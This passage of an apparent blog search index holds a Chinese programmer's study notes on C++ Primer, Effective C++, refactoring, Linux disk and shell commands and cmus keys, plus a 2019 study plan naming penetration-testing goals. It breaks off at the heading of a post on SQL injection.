浮点型文字常量默认为double型，可以在后面加“F”或“f”表示为float型。扩展精度由“L”指定,但是这两者只能用在十进制的表示中。\n6. 常见转义字符``` \\n换行，\\r回车，\\\\反斜杠，\\t水平制表符，\\‘单引号 ```\n7. 字符文字前加“L”，例如 L’a‘  表示宽字符文字，类型为wchar_t，用于例如汉语的某些语言的字符集合。\n8. 字符串文字的类型是常量字符数组，它有字符串文字本身以及编译器加上的表示结束的null字符构成。\n9. 宽字符串文字的类型是常量宽字符的数组。\n10. 如果两个字符串或宽字符串在程序中相邻，C++就会把它们连接在一起，并在最后加上一个空字符。\n11. 使用未定义行为的程序被称作是不可移植的。\n12. 为一个未知的用户组写一个健壮的通用函数，比“实现一个特定的算法来解决眼前的问题”要复杂的多。\n13. 数据类型决定了相关内存的大小、布局、能够存储在该内存区的值的范围以及可以应用其上的操作集。\n14. 当然，我们也可以将变量称为对象，将数据类型想象为类。\n15. 编译器保证对象在使用时的类型正确性。\n16. 对象声明的作用是使程序知道该对象的类型和名字。由关键字extern以及跟在后面的对象类型以及对象的名字构成。\n17. 对象声明不是对象定义，因此不会引起内存的分配。\n18. 一个对象只能定义一次，但是可以有无数次声明。\n19. 变量名必须以字母或者下划线开头。\n20. 如果定义的为全局变量，则系统会保证给它提供初始值0，而如果是局部变量或者说是通过new动态分配的，则系统不会提供初始值。\n21. 一定要养成变量定义之后立即进行初始化。\n22. 每一种内置数据类型都支持一种特殊的构造函数语法，可以将对象初始化为0，例如 int ival=int()；  double dval=double(); 。\n23. 对象可以用任意复杂的表达式来初始化，包括函数的返回值。\n24. 指针的典型用法是构建一个链接的数据结构，如树和链表，并管理在内存执行过程中动态分配的对象，以及作为函数参数类型，主要用来传递数组或者大型的类对象。\n25. 指针的类型可以只是编译器怎样解释特定地址上内存的内容，以及该内存区域应该跨越多少内存单元。\n26. （void*）类型可以被任何数据指针类型的地址值赋值（不包括函数指针）。\n27. 指针算数运算的典型用法是遍历一个数组。\n28. 一般的，我们用指针的算数运算来遍历C风格的字符串，每次指针增加1，直到到达终止空字符为止。\n30. string类型能够自动的将C风格的字符串转换为string对象。\n29. string的赋值操作符，st2=st3; 过程：首先将与st2相关联的字符存储区释放掉，让那后再分配足够存储与st3相关联的字符的存储区，最后将与st3相关联的字符拷贝到该存储区中。\n31. c_str()方法返回一个指向常量数组的指针。\n32. string类型同时也支持通过下标操作访问单个字符。\n33. 关键字const将一个对象转换成了一个常量，它为只读的。\n34. 常量在定义之后就不能进行修改，因此常量在定义时必须进行初始化。\n35. 试图将一个非const对象的指针指向一个常量对象的动作都会引起编译错误。\n36. const对象的地址只能赋值给指向const对象的指针，但是指向const对象的指针可以被赋以一个非const对象的地址（即使该对象非const,也无法通过该指针修改该对象的值）。\n37. 引用又可以称为别名，在实际应用中，引用主要被用作函数的形参，通常将类对象传递给一个函数。\n38. 引用一旦定义必须被初始化，并且一旦定义，就不能再指向其他对象。\n39. 引用的所有操作实际上都是应用在它所指的对象上，包括取地址操作符。\n40. const引用可以用不同类型的对象初始化，也可以是不可寻址的值，例如文字常量。但是同样的初始化对于非const引用是不合法的。\n41. 引用在内部存放的是一个对象的地址，它是该对象的别名。对于不可寻址的值以及不同类型的对象，编译器为了实现引用，必须生成一个临时对象，引用实际上指向该对象，但是用户不能访问它。例如：\n我们写一个 ``` double dval=1024;\n    const int &ri=dval;  ```\n编译器的实际代码是：```int temp=dval;   const int &ri=temp; ```\n所以如果我们使用的是非const对象，那么当我们修改ri的值的时候，我们实际上修改的是temp而不是dval。\n42. 指针和引用的两个主要区别：引用必须总是指向一个对象，如果用一个引用给另一个引用赋值，那么改变的是被引用的对象而不是引用本身。\n43. 虽然布尔类型的对象也被看作是一个整数类型的对象，但是它不能被声明为signed,unsigned,short或long.\n44. 当表达式需要一个算数值时，布尔对象和布尔文字都被隐式提升为int，false为0，true为1。\n45. 算术值和指针值也能被隐式转换为布尔类型的值，0或空指针被转换成false，所有其他的值都被转换成true。\n46. 枚举类型中，在默认情况下第一个枚举成员赋值为0，其后成员依次加1。\n47. 非const的变量不能被用来指定数组的维数。\n48. 字符串常量包含一个额外的终止空字符。\n49. 一个数组不能被另一个数组初始化，也不能赋值给另一个数组。\n50. C++不允许声明一个引用数组，即一组引用组成的数组。\n51. 任意结果为整数值的表达式都可以用来索引数组。\n52. C++没有提供编译时刻或者运行时刻的数组下标的范围检查，因此除了程序员自己之外，没有任何方法可以组织数组越界。\n53. 数组标识符代表数组中的一个元素的地址，它的类型是数组元素类型的指针。\n54. vector可以被另一个vector初始化，也可以赋值给另一个vector。\n55. 复数对象有float、double或者long double几种表示。\n56. typedef可以被用作程序文档的辅助说明，也能够降低声明的复杂度，同时也可以增强代码的可读性。\n57. 当一个对象的值可能会在编译器的控制或监测之外被改变时，应该将该对象声明成volatile，因此，编译器执行的某些例行优化行为不能应用在已指定为volatile的对象上。\n58. pair类可以在单个对象内部把两个相同类型或者不同类型的值关联起来。\n59. 重载的操作符依然可以被重载。\n60. 在类体外定义的内联成员函数，应该被包含在含有该类定义的头文件中。\n61. 输入操作符最多读入4095个符号。\n62. setw（）读入的字符数最多为给他设定的参数减去1，该函数在头文件iomanip中。\n63. 断言assert是仅在debug版本的程序中起作用的宏，它用于检查“不应该”发生的情况。一旦assert中的参数为false，那么程序就会中断。\n64. 如果一个对象的值可能会在编译器的控制或者监测之外被改变时，那么该对象应该声明成volatile。因此编译器执行的某些例行优化行为不能应用在已经指定为volatile的对象上。\n","tags":["C++primer"],"categories":["C++"]},{"title":"C++primer笔记————第一章","url":"%2F2019%2F01%2F02%2FC-primer%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E2%80%94%E2%80%94%E7%AC%AC%E4%B8%80%E7%AB%A0%2F","content":"\n##### C++概览 #####\n\n1. C++对数组类型的支持只限于”用来读写单个元素的机制“。C++不支持数组的抽象，也不支持对整个数组的操作。因此，我们不能用赋值操作符将将一个数组拷贝到另一个中去。\n2. 数组反映了数据与对其进行操作的算法的分离，而这正是过程化横需设计的特征。\n3. 对象可以静态分配，也可以动态分配。\n4. 静态分配和动态分配的区别：\n   1. 静态分配是在栈上进行的分配，在程序执行之前进行，效率较高，但是要求程序在执行之前就需要知道所需内存的类型和数量。\n   2. 动态分配是在堆上进行的分配。在程序执行的过程中进行，效率较低，但是要灵活很多。效率比静态分配要低。\n   3. 静态对象是有名字的变量，我们直接对其进行操作。而动态对象是没有名字的变量。我们通过指针间接的对其进行操作。\n   4. 静态对象的分配和释放都是由编译器自动进行处理的。而动态对象的内存分配和释放都是由程序员手动进行管理。如果在使用完动态对象之后忘记释放内存则会产生内存泄漏的情况。而分配和释放是靠new和delete两个操作符来完成。\n6. C++定义的取地址操作符&。\n7. 在C++中，指针的主要用途是管理和操纵动态分配的内存。\n8. 关键字private和public控制对类成员的访问。public成员函数，在一般程序的任何地方都可以访问他们。而private成员函数则只能在该类的成员函数或者友元（friend）中被访问。\n9. C++不允许成员函数和数据成员共享同一个名字，所以当出现同名的时候，一般习惯是在数据成员名字前加一个下划线。\n10. 函数调用会比直接访问内存灯开销要大很多。\n11. 内敛函数在它的调用点上直接展开，一般来说，内联函数不会引入任何函数调用。\n12. 在类定义里定义的成员函数会被自动当作为内联函数。此外，我们也可以用inline关键字显示得要求一个函数被视为内联函数。\n13. 函数重载：函数重载允许连个个或者更多的函数使用同一个名字，只要参数表不同，即为参数数目不同或者参数类型不同。注意，参数名称不同不算为参数表不同。\n14. 被声明为static的数据成员很特殊。这个类的对象无论被定义多少个，该成员只会有一个。因此，它是在类的所有对象之间共享数据的一种方式。\n    + 注：被声明为static的对象只能初始化一次，之后的初始化会被直接忽略掉。\n15. 域操作符：：表示后面跟着灯成员属于那个域（类或者命名空间）。\n16. 引用是一种没有指针语法的指针。和指针一样，引用提供对对象的间接访问。\n17. 一般来说，析构函数会释放在类对象使用和构造过程中所获得的资源。\n18. 类的构造函数主要用来初始化类对象的数据成员。析构函数主要负责释放类对象在生命周期内申请到的所有资源。\n19. 关键字protected，此关键字修饰的成员派生类可以访问，但是外界无法访问。\n20. 派生类对象实际上是由几部分构成：每个基类是一个类的子对象，它在新定义的派生类中有独立的一部分。\n21. 派生类的初始化过程：\n    1. 自动调用每个基类的构造函数来初始化相关的基类子对象。\n    2. 执行派生类的构造函数。\n    3. 从设计的角度来讲，派生类的构造函数应该只初始化那些在派生类中被定义的数据成员。而不是在基类中的数据成员。\n22. 基类的构造函数和析构函数并没有被派生类继承。\n23. 模板能够将类或函数定义内部的类型参数化。\n24. throw抛出异常，catch捕获异常，但是只会捕获try块之中抛出的异常。\n25. 如果try块内抛出的异常不能被相关联的catch语句处理，那么函数将被异常终止。\n26. 命名空间别名允许用一个可替代的、短的或者更一般的名字与一个现有的命名空间关联起来。\n27. 别名也可以用来封装正在使用的实际命名空间。\n28. 使用using只是符可以使命名空间内的所有声明都可见。当然using声明也可以使命名空间中的单个声明可见。\n29. 为了防止标准C++库的组件污染用户程序的全局命名空间。所有标准C++库的组件都声明在一个被称为std的命名空间内。\n30. 遍历vector的两种方法，使用下标操作符和使用迭代器。当然，更推荐使用迭代器的方法来对vector进行遍历操作。\n31. 迭代器是一个支持指针类型抽象的类对象。\n32. 可以用在vector上的泛型操作：\n   1.  搜索：find（）、find_if()、search()、binary_search()、count()和count_if()\n   2. 分类排序和通用排序：sort()、partial_sort()、merge()、partition()、rotate()、reverse()、random_suffle()\n   3. 删除：unique（）和remove（）\n   4. 算数：accumulate()、partial_sum()、inner_product()和adjacent_difference()\n   5. 生成和变异：generate()、fill()、transformation（）、copy()、for_each()\n   6. 关系：equal()、min()、max()\n   7. 这些算法的头文件<algorithm>\n","tags":["C++primer"],"categories":["C++"]},{"title":"第一章","url":"%2F2019%2F01%2F02%2F%E7%AC%AC%E4%B8%80%E7%AB%A0%2F"},{"title":"条款","url":"%2F2019%2F01%2F01%2F%E6%9D%A1%E6%AC%BE%2F","content":"\n\n1. 将C++视为一个语言联邦。今天C++已经成为一个多重泛型编程语言。一个同时支持过程形式、面向对象形式、函数形式、泛型形式、元编程形式的语言。\n    在C++98标准中：C++分为C、C with class、template、STL四部分组成。\n2. 尽量用const、enum、inline替换#define（尽量使用编译器替换预处理器）。\n   常量定义式通常放在头文件中。\n   #define不重视作用域。\n3. 尽可能使用const （use const whenever possible)\n  将某些东西声明为const可帮助编译器侦测出错误用法，const可被施加在任何作用域的对象、函数参数、函数返回类型和成员函数本体。\n  编译器强制实施bitwish constness，但是你编写程序时应该使用概念上的常量性（conceptual constness）\n  当const函数和non-const函数有实质等价的实现时，令non-const版本调用const可避免代码重复。\n4. 确定对象使用前已经先被初始化。\n   对内置型对象进行手工初始化，因为C++不保证初始化它们。\n   构造函数最好使用member initialization list，而不要在构造函数本体内使用赋值操作。list列出的成员列表的排列顺序应该和声明顺序相同。\n   为了免除“跨编译单元之初始化次序的问题，请以local static对象替换non-local static对象。\n5. Know what functions C++ silently write and calls\n   编译器可以暗自为class创建default构造函数，copy构造函数，copy assignment操作符以及析构函数。\n6. Explicitly disallow the use of compiler-generated functions you do not want.\n\n7. Declare destructors virtual in polymorphic base class.\n   polymorphic(带有多态性质的）base classes 应该声明一个virtual析构函数，如果class拥有一个virtual函数，那么它应该拥有一个virtual析构函数。\n   classes的设计目的如果不是用来作为base classes使用，或者不是为了具备ploymorphically（多态性），就不应该声明virtual析构函数。\n\n8. Prevent exceptions from leaving destructors.不要让异常逃离析构函数\n   析构函数绝对不要吐出异常，如果一个被析构函数调用的函数有可能会抛出异常，析构函数应该捕捉任何异常并吞下他们（不传播）或结束程序。如果客户需要对某个操作函数运行期间抛出的异常做出反应，那么class应该提供一个普通函数（而非在析构函数中）执行该操作。\n9. Never call virtual functions during on construction or destruction.绝对不在构造和析构过程中调用virtual函数。\n    在base class构造期间，virtual 函数并非是virtual函数。\n10. Have assignment operators return a references to ``` *this ```. 令赋值操作符返回一个references to ```*this ```  赋值采用的是右结合律。\n11. Handle assignment to self in operator=  在赋值操作符中处理自我赋值\n      确保当对象自我赋值时operator=仍然有良好的行为。其中技术包括比较“来源对象”和“目的对象”的地址，精心周到的语句顺序、以及copy-and-swap。\n     确定任何函数如果操作一个以上的对象，而其中多个对象是同一个对象的时候，其行为仍然正确。\n12. Copy all part of an object.复制对象时勿忘记其中的每一个成分。\n      copying 函数应该确保复制了对象中的所有的成员变量以及所有的base class成分。\n      不要尝试用某一个copying函数实现另一个copying函数，例如copy构造函数和copy操作符，应该将共同代码放到第三个函数中，并由两个copy函数共同调用。\n13. Use objects to manage resources\n      获得资源之后立刻放到管理对象中。\n      管理对象运用析构函数确保资源被释放。\n      资源取得时机便是初始化时机。\n14. Think carefully about copying behavior in resource-managing classes.\n15. Provide access to raw resources in resource-managing classes.在资源管理类中提供对原始资源的访问。\n      对原始资源的访问可能经由显式转换或隐式转换，一般来讲，显式转换比较安全，隐式转换令客户感觉方便。\n16. Use the same form in corresponding use of new and delete .成对使用new和delete时使用相同形式。\n     最好尽量不要对数组形式做typedefs动作。\n17. 使用独立语句将new出来的对象放入智能指针中。\n     编译器对“跨越语句的各项操作”没有重新排列的自由（只有在语句内才会有此自由度）。\n18. 让接口容易被使用，不容易被误用。\n      促进接口正确使用的方法包括接口的一致性，以及与内置类型的行为兼容。\n       阻止误用的方法包括建立新的类型，限制类型上的操作，束缚对象值，以及消除客户的资源管理责任。\n19. Treat class design as type design 设计class犹如设计type\n       设计class时需要涉及的问题：\n      + 新type的对象应该如何被创建和销毁。\n      + 对象的初始化和对象的赋值有什么差别。\n      + 新type的对象如果被pass by value，意味着什么。\n      + 什么是新type的”合法值“。\n      + 你的新type是否需要配合某个继承图系（inheritance graph)。\n      + 你的新type需要哪些转换。\n      + 什么样的操作符和函数对于此type是合理的。\n      + 什么样的函数应该设置为private。\n      + 谁该取用新type的成员。\n      + 什么是新type的“未声明接口”。\n      + 你的新type有多么一般化。\n      + 你真的需要一个新type吗？\n20. Prefer pass-by-reference-to-const to pass-by-value\n      此规则不适用与stl的迭代器和函数对象\n21. Don‘t want to try return a reference when you must return an object.\n22. Declare data members private.\n     protected并不比public更具有封装性。\n23. Prefer non-member non-friend functions to member functions\n     这样可以增加封装性，包裹弹性（packaging flexibility）和机能扩充性。\n24. 若所有参数都需要类型转换，请为此采用non-member函数\n25.  Consider support for a non-throwing swap考虑写出一个不抛异常的swap函数。\n     当std::swap对你的类型的转换效率不高的时候，提供一个swap成员函数，并确定这个函数不抛异常。\n      如果你提供一个member swap， 也应该提供一个non-member swap 来调用前者，对于class（而非templates），也请特化std::swap.\n      千万不要尝试在std内加入某些对于std而言全新的东西。\n26. Postpone variable definitions as long as possible.尽可能的推迟变量定义的位置。\n      单一对象可能会有一个以上的地址（如base×指向它的地址和derived×指向它的地址。\n\n\n+ 技巧：\n  + 所谓软件设计，是“令软件做出你希望它做的事情”的步骤和做法。\n  + 在C++编译器的底层会发现，reference往往以指针实现出来。因此，pass by reference通常意味这传递的是指针。\n  + 对于内置类型来说     pass by value 往往比pass by reference 效率高一些。\n","tags":["Effecitive C++"],"categories":["C++"]},{"title":"重构的设计原则","url":"%2F2018%2F12%2F31%2F%E9%87%8D%E6%9E%84%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99%2F","content":"\n##### 以下取自重构改善代码的既有设计 #####\n\n1. 重新组织函数\n 1. Extract Method 提炼函数\n    将需要修改的代码放到一个独立函数中，并让函数名解释该函数的用法。\n 2. Inline Method内联函数\n    在函数调用点插入函数本体，然后移除该函数。\n 3. Inline Temp 内联临时变量\n    将所有对该变量的引用动作，替换为对它赋值的那个表达式自身。\n 4. Replace Temp with Query 以查询取代临时变量\n    将表达式提炼到一个独立函数中。将这个临时变量的所有引用点替换为对新函数的调用。此后，新函数就可以被其他函数使用。\n 5. Introduce Explaining Variable 引入解释性变量\n    将该复杂表达式（或其中一部分）的结果放进一个临时变量，以此变量的名称来解释表达式的用途。\n 6. Split Temporary Variable分解临时变量\n    针对每次赋值，创造一个独立、对应的临时变量。\n 7. Remove Assignments to Parameters移除对参数的赋值\n    以一个临时变量取代该参数的位置\n 8. Replace Method with Method Object以函数对象取代函数\n    将这个函数放进一个单独对象中，如此一来局部变量就成了对象内的字段，然后就可以在同一个对象中将这个大型函数分解为多个小型函数。\n 9. Substitute Algorithm替换算法\n    将函数本体替换为另一个算法。\n2. 在对象之间搬移特性\n 1. Move Method 搬移函数\n    在该函数最常引用的类中建立一个有着类似行为的新函数。或将旧函数变成一个单纯的委托函数，或是将旧函数完全移除。\n 2. Move Field 搬移字段\n    在目标类中新建一个字段，修改源字段中的所有用户，令它们改用新字段。\n 3. Extract Class提炼类\n    建立一个新类，将相关的字段和函数从旧类搬移到新类。\n 4. Inline Class将类内联化\n    将这个类的所有特性搬移到另一个类中，然后移除原类。\n 5. Hide Delegate隐藏委托关系\n    在服务类上建立客户所需的所有函数，用以隐藏委托关系。\n 6. Remove Middle Man移除中间人\n    让客户直接调用委托类。\n 7. Introduce Foreign Method引入外加函数\n    在客户类中建立一个函数，并以第一参数的形式传入到一个服务类实例。\n 8. Introduce Local Extension引入本地扩展\n    建立一个新类，使它包含这些额外函数。让这个扩展品成为源类的子类或者包装类。\n3. 重新组织数据\n 1. Self Encapsulate Field自封装字段\n    为这个字段建立取值/设值函数，并且只以这些函数来访问字段。\n 2. Replace Data Value with Object以对象取代数据值\n    将数据项变成对象。\n 3. Change Value to Reference 将值对象改为引用对象\n    将这个值对象改为引用对象\n 4. Change Reference to Value 将引用对象改为值对象\n    将引用对象改为值对象\n 5. Replace Array with Object以对象取代数组\n    以对象替换数组，对于数组中的每个元素，以一个字段来表示。\n 6. Duplicate Observed Data复制“被监视数据”\n    将该数据复制到一个领域对象中，建立一个Observer模式，用以同步领域对象和GUI对象内的重复数据。\n 7. Change Unidirectional Association to Bidirectional将单向关联改为双向关联\n    添加一个反向指针，并使修改函数能够同时更新两条连接。\n 8. Change Bidirectional Association to Unidirectional将双向关联改为单项关联\n    去除不必要的关联。\n 9. Replace Magic Number with Symbolic Constant以字面常量取代魔法数\n    创造一个常量，根据其意义为它命名，并将上述的字面数值替换为这个常量。\n 10. Encapsulate Field封装字段\n    将它声明为private，并提供相应的访问函数。\n 11. Encapsulate Collection 封装集合\n    让这个函数返回该集合的一个只读副本，并在这个类中提供添加/移除集合元素的函数\n 12. Replace Record with Data Class以数据类取代记录\n    为该记录创建一个“哑”数据对象。\n 13. Replace Type Code with Class以类取代枚举\n    以一个新的class替换该枚举类型\n 14. Replace Type COde with Subclasses以子类取代枚举\n    以一个子类取代这个枚举变量\n 15. Replace Type Code with State/Strategy\n 16. Replace Subclass with Fields以值域取代子类\n    如果你的各个subclasses的唯一差别只在返回常量数据的函数身上，修改这些函数，使它返回superclass中的某个新增值域，然后销毁subclasses\n4. 简化条件表达式\n 1. Decompose Conditional分解条件式\n    从if 、else 的段落中分别提炼出独立函数\n 2. Consolidate Conditional Expression合并表达式\n    合并可以合并的条件式，并将这个条件式提炼成为一个独立函数。\n 3. Consolidate Duplicate Conditional Fragments 合并重复的条件片段\n    将重复的代码搬移到条件式之外。\n 4. Remove Control Flag 移除控制标记\n    以break语句或者return语句取代控制标记。\n 5. Replace Nested Conditional with Guard Clauses以卫语句取代嵌套条件式\n    使用卫语句表现所有的特殊情况。\n 6. Replace Conditional with Polymorphism以多态取代表达式\n    如果有一个条件式，会根据对象类型的不同而选择不同的行为，将这个表达式每个分支放进一个subclass内的覆写函数中，然后将原始函数声明为抽象函数。\n 7. Introduce Null Object引入Null对象\n    将null value替换为null object\n 8. Introduce Assertion引入断言\n    如果某一段代码需要对程序状态做出某种假设。那么请以assertion明确表现这种假设。\n5. 简化函数调用\n 1. Rename Method\n 2. Add Parameter\n 3. Remove Parameter\n 4. Separate Query from Modifier将查询函数和修改函数分离\n 5. Parameterize Method令函数携带参数\n 6. Replace Parameter with Explicit Methods 以明确函数取代参数\n 7. Preserve Whole Object保持对象完整。\n    如果需要从某个对象中取出若干值，将它们作为某一次函数调用时的参数。那么应该改成传递整个对象。\n 8. Replace Parameter with Methods 以函数取代参数\n    对象调用某个函数，并将所得结果作为参数，传递给另一个函数。而接受该参数的函数也可以调用前一个函数，那么让参数接受者去除该项参数，并直接调用前一个函数。\n 9. Introduce Parameter Object引入参数对象\n    某些参数总是很自然的同时出现，那么以一个对象取代这些参数。\n 10. Remove Setting Method移除设值函数\n    如果对象里的某些成员变量在对象初创时被设值，然后就不再改变，那么去掉该成员变量的设值函数。\n 11. Hide Method 隐藏某个函数\n 12. Replace Constructor with Factory Method 以工厂函数取代构造函数\n    如果你希望在创建对象时不仅仅是对它做简单的构建动作，那么用工厂函数取代构造函数\n 13. Encapsulate Downcast 封装向下转型动作。\n    将向下转型的动作移到函数中。\n 14. Replace Error Code with Exception以异常取代错误码\n 15. Replace Exception with Test以测试取代异常\n    在调用函数之前先检查\n6. 处理概括关系\n 1. Pull Up Field 值域上移\n    两个子类有相同的成员变量，那么将成员变量移动到父类中。\n 2. Pull Up Method函数上移\n 3. Pull Up Constructor Body\n 4. Push Down Field\n 5. Push Down Method\n 6. Extract Subclass 提炼子类\n 7. Extract Superclass 提炼父类\n 8. Extract Interface提炼接口\n 9. Collapse Hierarchy折叠继承体系\n 10. Form Template Method 塑造模板函数\n 11. Replace Inheritance with Delegation 以委托取代继承\n 12. Replace Delegation with Inheritance\n7. 大型重构、重构、复用与现实\n 1. Tease Apart Inheritance 梳理并分解继承体系\n 2. Convert Procedural Design to Objects将过程化设计转化为对象设计\n 3. Separate Domain from PRESENTATION 将领域和表述/显示分离\n 4. Extract Hierarchy提炼继承体系\n","tags":["重构"],"categories":["代码设计"]},{"title":"2019计划[随时变动版]","url":"%2F2018%2F12%2F31%2F2019%E8%AE%A1%E5%88%92-%E9%9A%8F%E6%97%B6%E5%8F%98%E5%8A%A8%E7%89%88%2F","content":"\n##### 又到了每年年底做下一年的（吹）计（牛）划（逼）的时候了，但是这次比较6的是自己不但吹了，还写下来了，还发出来了（虽然并不会有人看，但还是请我掐会腰） #####\n\n###### 计划 ######\n\n1. 配置好mac虚拟机，达到生产环境能用的程度。     [ get,因为并不知道生产环境需要什么东东，还是傻鸟好用 ]\n2. 将有道笔记中的内容搬运到博客上。             [ get ]\n2. 读完书虫学前版部分共两个版本。               [ 1/3 ]\n3. 学会写linux脚本，到达初学者水平[并不知道初学者什么水平系列]\n4. 学会学python脚本，到达初学者水平[并不知道初学者什么水平系列]\n5. 学会写windows脚本，到达初学者水平[并不知道初学者什么水平系列]\n6. 入门渗透测试，作为第一主攻方向[废话系列]\n7. 入门逆向，作为第二主攻方向[废话系列]\n8. 学会写sql脚本，到达能熟练使用sql注入的水平[依然废话系列]\n9. 学习html，到达能看懂的水平。\n10. 学习吉他[买的吉他不能吃灰]\n11. 整理欧洲音乐史的时间线[掐会腰系列]\n12. 学会烤戚风蛋糕[掐会腰系列]\n13. 学习b站视频\n    + kali入门教程[撇一眼自己的傻鸟]\n    + 经典web漏洞深度讲解\n    + 2018中级信息安全工程师视频\n    + 麦子学院web安全教程\n    + 米安网 无线网络安全\n    + ctf入门视频                                 [get]  并没有讲什么有用的东西，直接跳着略一遍\n    + 二进制安全深入理解\n    + web 安全渗透工程师\n    + 深入研究windows内部原理系列\n    + linux-web安全渗透[千峰教育]\n    + 游戏逆向-植物大战僵尸逆向分析\n    + cracer 教程                                 [get]\n    + 西普杯解析\n    + 基本乐理[付妮版本]\n    + 新概念英语第二册\n    + 858计算机系统安全   \n\n\n###### 追加 ######\n\n1. sql入门完成\n","tags":["计划"],"categories":["碎碎念"]},{"title":"linux知识点总结","url":"%2F2018%2F12%2F30%2Flinux%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%2F","content":"\n1. 主分区只能有四个，拓展分区只能有一个，并且算作主分区的一种，即为主分区加拓展分区一共四个。\n2. 逻辑分区：逻辑分区是在扩展分区中划分的，如果是IDE硬盘，Linux最多支持59个逻辑分区，如果是SCSI硬盘，LInux最多支持11个逻辑分区\n扩展分区不能格式化，也不能写入数据\n3. 分区号1、2、3、4只能给主分区和扩展分区使用，不能给逻辑分区使用\n4. ext4最大支持1EB文件系统和16TB的文件\n5. 根下的proc和sysfs是内存挂载点\n6. 文件系统查看命令df -h 使用习惯单位显示容量  \n  -a显示所有的文件系统信息，包括特殊文件系统，比如/proc、/sysfs\n-T显示文件系统类型\n7. ls查看目录的大小只能统计一级目录的文件名所占大小\n8. 统计目录或文件大小     -a 显示每个子文件的磁盘占用量，默认只统计子目录的磁盘占用量\n-h使用习惯单位显示磁盘占用量\n-s统计总占用量，而不列出子目录和子文件的占用量\n9. df命令是从文件系统考虑的，不光要考虑文件占用的空间，还要统计被命令或程序占用的空间（最常见的就是文件已经被删除了，但是程序并没有释放空间）\n10. du命令是面向文件的，只会计算文件或目录占用的空间， df看到的空间才是真正的可以使用的空间\n11.  文件系统修复命令fsck [选项] 分区设备文件名\n-a 不用显示用户提示，自动修复文件系统\n-y 自动修复，和-a 作用一致，不过有些文件系统只支持-y\n12. dumpe2fs 查询分区的数据块（主要是超级块）\n13. mount    -l 查询系统中已经挂载的设备，显示卷标名称\n       -a 依据配置文件/etc/fstab的内容，自动挂载\n         \t     [-t 文件系统]   [ -L卷标名 ]   [ -o 特殊选项]   设备文件名   挂载点\n-o特殊选项中有noexec参数，可以导致可执行文件无法执行，并且不受root用户和chmod权限的制约\n14. 一般来讲，/media目录用来挂载光盘，/mnt挂载U盘\n15. umount 设备文件名或挂载点\n16. mount -t ntfs-3g 分区 挂载点\n17. fdisk 分区命令  -d 删除分区\n   -t  更改分区ID号\n   -n 新建分区\n   -w 保存退出\n   -q 不保存退出\n   -l  查看分区类型\n18. partprobe重新读取分区表信息\n19. mkfs -t  文件类型  分区盘符    格式化分区\n20. mkswap 分区盘符     格式化swap分区\nswapon  分区盘符   把分区盘符加入swap分区\nswapoff   分区盘符  把分区盘符从交换空间取消\n","tags":["笔记"],"categories":["Linux"]},{"title":"cmus使用","url":"%2F2018%2F12%2F30%2Fcmus%E4%BD%BF%E7%94%A8%2F","content":"\n\n+ [q]             quit -i                         退出\n+ [^C]            :quit<enter> to exit cmus.      退出（^就是ctrl的意思）\n+ [b]             player-next                     下一首\n+ [c]             player-pause                    暂停\n+ [ x]             player-play                     播放\n+ [z]             player-prev                     前一首\n+ [v]             player-stop                     停止\n+ [^L]            refresh                         刷新\n+ [n]             search-next                     查找下一个\n+ [N]             search-prev                     查找上一个\n+ [.]             seek +1m                        快进\n+ [l], [right]    seek +5                         快快进\n+ [,]             seek -1m                        快退\n+ [h], [left]     seek -5                         快快退\n+ [M]             toggle play_library             切换到playlist\n+ [o]             toggle play_sorted              切换成all from sorted library\n+ [^R]            toggle repeat_current           对当前循环\n+ [t]             toggle show_remaining_time      显示剩余时间（默认是显示播放时间）\n+ [s]             toggle shuffle                  乱序播放\n+ [i]             toggle show-hidden              显示/取消显示隐藏文件\n","tags":["linux工具"],"categories":["Linux"]},{"title":"linux命令行与脚本编程笔记","url":"%2F2018%2F12%2F30%2Flinux%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8E%E8%84%9A%E6%9C%AC%E7%BC%96%E7%A8%8B%E7%AC%94%E8%AE%B0%2F","content":"\n###### 第一章 ######\n1. Linux内核负责的四项功能：\n  + 系统内存管理\n  + 软件程序管理\n  + 硬件设备管理\n  + 文件系统管理\n2. 硬盘中的swap空间指的是虚拟内存空间\n3. /proc/meminfo文件中保存了当前内存的状态，包括虚拟内存\n4. 系统开机自启动的进程放在/etc/inittab中\n5. Linux系统将硬件设备当成特殊的文件，称为设备文件。设备文件有3种不同的分类：\n  + 字符型设备文件;\n  + 块设备文件。\n  + 网络设备文件。\n6. 字符型设备文件是指处理数据时每次只能处理一个字符的设备，大多数的调制解调器和终端都是作为字符型设备文件创建的。\n7. 块设备文件是指处理数据时每次能处理大块数据的设备，比如硬盘。\n8. 网络设备文件是指采用数据包发送和接收数据的设备，包括各种网卡和一个特殊的回环设备。这个回环设备允许Linux系统使用通用的网络编程协议同自己通信。\n9. LInux为系统上的每个设备都创建一种特殊的文件，称为”节点“。与设备的所有通信都是通过设备节点来完成的。\n10. GNU项目为Linux系统提供了一组核心工具被成为coreutils软件包。它由三部分构成：\n  + 用以处理文件的工具\n  + 用以操作文本的工具\n  + 用以管理进程的工具\n\n###### 第三章 ######\n\n1. cat命令  \n  + 可以使用重定向符号将几个文件的内容导入到同一个文件中。\n  + 注意tac命令\n2. less is more\n3. wc命令：   统计行数，单词数，字节数\n4. touch 可以用于更新时间戳\n5. mkdir 创建嵌套目录需要用到-p命令\n6. sort -n 可以按照数值排序，-r反向排序\n7. uniq文本去重\n  + -c选项可以显示该行重复的次数\n8. tr用指定字符替换文件或变量中的内容\n9. 注意setuid和setgid。即为权限位中的s\n\n###### 第四章 ######\n\n1. paste命令合并多个文件\n2. /dev/zero 空字符输出\n3. /dev/null 黑洞\n4. dd命令（做启动盘贼好使）\n  + bs指定块大小\n  + count指定从输入读取的块的数量\n5. gzip、bzip2\n6. tar命令\n  + gzip压缩  zcvf\n  + bzip2压缩 jcvf\n  + tvf 在不解包的情况下列出tar包文件中的内容，可以配合z和j参数显示压缩文件中的内容。\n  \n","tags":["笔记"],"categories":["Linux"]},{"title":"C++中的return","url":"%2F2018%2F12%2F30%2FC-%E4%B8%AD%E7%9A%84return%2F","content":"\n构造函数中是可以包含return的，我记得在函数的末尾会有一个隐含的return。构造函数应该也适用于它，所以可以显式的加入return语句，但是不能有返回值。\n","tags":["C++语法"],"categories":["C++"]},{"title":"sql注入","url":"%2F2018%2F12%2F24%2Fsql%E6%B3%A8%E5%85%A5%2F","content":"\n##### 定义 #####\n\n  